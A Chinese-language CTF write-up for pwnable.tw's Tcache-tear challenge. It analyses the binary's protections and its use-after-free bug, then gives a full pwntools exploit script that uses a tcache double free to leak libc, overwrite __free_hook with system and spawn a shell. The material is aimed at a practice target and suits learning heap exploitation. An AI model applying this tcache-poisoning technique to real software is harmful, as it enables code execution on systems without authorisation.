# pwnable.tw Tcache-tear

### 0x1 分析

开的保护：

```shell
➜  Tcache-Tear checksec tcache_tear
[*] './Tcache-Tear/tcache_tear'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    FORTIFY:  Enabled
```

地址固定。

标准菜单程序：`menu()`

```c
int menu()
{
  puts("$$$$$$$$$$$$$$$$$$$$$$$");
  puts("      Tcache tear     ");
  puts("$$$$$$$$$$$$$$$$$$$$$$$");
  puts("  1. Malloc            ");
  puts("  2. Free              ");
  puts("  3. Info              ");
  puts("  4. Exit              ");
  puts("$$$$$$$$$$$$$$$$$$$$$$$");
  return printf("Your choice :");
}
```

`add()`

```c
int add()
{
  unsigned __int64 v0; // rax
  int size; // [rsp+8h] [rbp-8h]

  printf("Size:");
  v0 = read_ll();
  size = v0;
  if ( v0 <= 0xFF )
  {
    ptr = malloc(v0);
    printf("Data:");
    read_n((__int64)ptr, size - 0x10);
    LODWORD(v0) = puts("Done !");
  }
  return v0;
}
```

`info()`

```c
ssize_t info()
{
  printf("Name :");
  return write(1, &name, 0x20uLL);
}
```

`free()`在`main()`里面，被限制了次数：但是`ptr`并没有被清零。

```c
if ( v4 <= 7 )
{
  free(ptr);
  ++v4;
}
```

#### 漏洞利用

我们看到libc的版本的2.27

```shell
GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1) stable release version 2.27.
```

那么，我们可以利用Tcache 的Double Free。

由于Tcache Bin在取出的时候并没有检查，可以轻松修改Tcache bin 的链指向任意位置。

我们可以构造`name`这个位置为一个大的`chunk`的`fd`位置，当它被`free`的时候被放入Unsorted bin，就可以通过`info()`来泄漏`libc`。

再次Double Free让Tcache bin的链指向`__free_hook`，修改其为`system`。然后创建一个`chunk`填入`/bin/sh\x00`，即可让`free()`的参数`ptr`指向`/bin/sh\x00`，拿到shell。

### 0x2 EXP

```python
#! /usr/bin/python
#-*- coding: utf-8 -*-
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context(arch = 'amd64' , os = 'linux', log_level='debug')

# p = process('./tcache_tear')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p = remote('chall.pwnable.tw', 10207)
libc = ELF('./libc.so')
elf = ELF('./tcache_tear')

bss = 0x602050
'''
$$$$$$$$$$$$$$$$$$$$$$$
  1. Malloc
  2. Free
  3. Info
  4. Exit
$$$$$$$$$$$$$$$$$$$$$$$
'''
def debug(p, cmd):
    gdb.attach(p, cmd)
    pause()

def add(size, content):
    p.sendlineafter('Your choice :', '1')
    p.sendlineafter('Size:', str(size))
    p.sendlineafter('Data:', content)

def free():
    p.sendlineafter('Your choice :', '2')

def info():
    p.sendlineafter('Your choice :', '3')

p.sendlineafter('Name:', 'asd')
# leak libc
add(0x70, 'aaaaa')
free()  # idx : 1
free()  # idx : 2
add(0x70, p64(bss + 0x500))
add(0x70, 'aaaa')
payload = p64(0) + p64(0x21) + p64(0) * 3 + p64(0x21)
add(0x70, payload)

add(0x60, 'aaaa')
free()  # idx : 3
free()  # idx : 4
add(0x60, p64(bss))
add(0x60, 'aaaaa')
payload = p64(0) + p64(0x501) + p64(0) * 5 + p64(bss + 0x10)
add(0x60, payload)
free()  # idx : 5
# debug(p, 'bin\n')
info()
p.recvuntil('Name :')
main_arena = u64(p.recv(6).ljust(8, '\x00')) - 96
libc.address = main_arena - 0x3ebc40
success('libc : '+str(hex(libc.address)))
# debug(p, 'bin\n')
pause()

# get shell
add(0x50, 'aaa')
free()
free()
add(0x50, p64(libc.sym['__free_hook']))
add(0x50, 'aaaa')
add(0x50, p64(libc.sym['system']))
add(0x20, '/bin/sh\x00')
free()
p.interactive()
```

